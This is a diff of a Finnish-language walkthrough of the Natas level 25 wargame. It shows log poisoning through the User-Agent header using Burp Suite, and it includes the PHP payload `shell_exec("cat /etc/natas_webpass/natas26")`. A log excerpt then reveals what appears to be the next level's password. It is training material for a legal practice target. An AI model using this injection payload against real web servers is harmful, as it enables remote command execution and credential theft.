@@ -358,14 +358,40 @@ Sitten se repeater pyyntö tulee tänne.
 
 Tässä (alempi kuva) - lisäsin request koodi rivinsä yhteen kuin: `<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>` ja riittää kumoo **User-Agent:** olevat tekstit ja lisää tämä siihen perään.
 
+**PIENI HUOMOINA**: tässä seuraavista osa kuvista osassa epäonnistunut saamaan natas26 salasansa, että menee väärin ja hyvä harjoitus kuitenkin.
+
 ![alt text](./kuvat-level22-28/natas25-10.png)
 
+Tässä siis lähetin send, mutta tuli pientä ongelmia en tiedä miksi ei tullut muutosta 
+
+![alt text](./kuvat-level22-28/natas25-11.png)
 
 
+![alt text](./kuvat-level22-28/natas25-12.png)
 
+![alt text](./kuvat-level22-28/natas25-13.png)
 
+Jotenkin ainakin tässä tuli tuloksena (oikealle), mutta tuosta kopsatusta tekstistä ei ollut ainakaan vastaus
 
+![alt text](./kuvat-level22-28/natas25-14.png)
 
+**Nyt tässä**, alkoi pelittää koska otin uuden **cookies** evästeen arvonsa ja korvasin sen tuhon pyyntöön, jotta se lähettää sen uudestaan ja **reponse** ikkunassa antoi kyllä, mutta halusin myös nähdä sen virallisen vastauksena tässä **Burp suite** omassa selaimessa ja kyllä pelitti nyt!!
+
+Tämä on se vastaus ja alemmassa kuvassa on sama dejavu toisto:
+
+```
+
+[24.07.2025 09::36:04] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::36:47] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 
+
+[24.07.2025 09::37:16] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::37:37] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." 
+[24.07.2025 09::38:23] "Directory traversal attempt! fixing request."
+
+[24.07.2025 09::47:51] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request." [24.07.2025 09::48:18] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request." [24.07.2025 09::48:50] Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36 "Directory traversal attempt! fixing request."
+```
+
+![alt text](./kuvat-level22-28/natas25-15.png)
+
+---
 
 
 
